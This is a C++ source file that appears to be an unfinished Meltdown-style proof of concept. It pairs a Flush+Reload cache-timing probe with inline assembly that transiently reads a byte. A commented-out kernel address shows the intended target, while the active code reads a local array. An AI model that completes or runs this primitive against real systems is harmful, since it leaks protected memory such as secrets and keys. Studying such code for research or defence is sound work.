#include <iostream>
#include <signal.h>
#include <sys/mman.h>

const unsigned long threshold = 500;

uint8_t* data;

int probe(uint8_t* addr, unsigned long threshold) {
    volatile unsigned long time;

    asm __volatile__(" mfence                   \n"
                     " lfence                   \n"
                     " rdtsc                    \n"
                     " lfence                   \n"
                     " mov esi, eax             \n"
                     " mov eax, DWORD PTR [%1]  \n"
                     " lfence                   \n"
                     " rdtsc                    \n"
                     " sub eax, esi             \n"
                     " clflush [%1]             \n"
                     : "=a"(time)
                     : "c"(addr)
                     : "esi", "edx");
    std::cout << "Time: " << time << std::endl;
    return time < threshold;
}

void flush(uint8_t* start, uint8_t* end)
{
    while(start != end)
    {
        asm __volatile__(" clflush [%0] \n" : : "a"(start) :);
        ++start;
    }

}

static void handler(int sig, siginfo_t* si, void* unused) {
    uint8_t result[256];
    printf("Got SIGSEGV at address: 0x%lx\n", (long)si->si_addr);
    printf("Implements the handler only\n");
    for (int i = 0; i < 256; ++i)
        result[i] = probe(&data[i * 4096], threshold);

    for (int i = 0; i < 256; ++i)
        std::cout << static_cast<int>(result[i]) << std::endl;

    exit(EXIT_FAILURE);
}

int main(int argc, char* argv[]) {
    uint8_t test[256];
    
    for(int i =0; i < 256; ++i)
        test[i] = i;

    data = new uint8_t[256 * 4096];
    struct sigaction sa;

    sa.sa_flags = SA_SIGINFO;
    sigemptyset(&sa.sa_mask);
    sa.sa_sigaction = handler;
    // if (sigaction(SIGSEGV, &sa, NULL) == -1) {
    //     std::cout << "failed" << std::endl;
    // }
    
    uint8_t* probeAddr = &data[0];

    //uint8_t* addr = reinterpret_cast<uint8_t*>(0xffff880000000000);
    uint8_t* addr = &test[128];

    //flush(probeAddr, probeAddr + 256 * 4096);
    //flush(&test[0], &test[255]);

    asm __volatile__("mov rax, 0 \n"
                     "retry:  \n"
                     "mov al, BYTE PTR [%0] \n"
                     "shl rax, 0xc \n"
                     "jz retry \n"
                     "mov rbx, QWORD PTR [%1 + rax] \n"
                     :
                     : "r"(addr), "r"(probeAddr)
                     : "rax", "rbx");

    int result[256];
    for(int i = 0; i < 256; ++i){
        result[i] = probe(&data[i* 4096], threshold);
    }

    for (int i = 0; i < 256; ++i) {
        std::cout << "Test: " << result[i] << std::endl;
    }

    return 0;
}
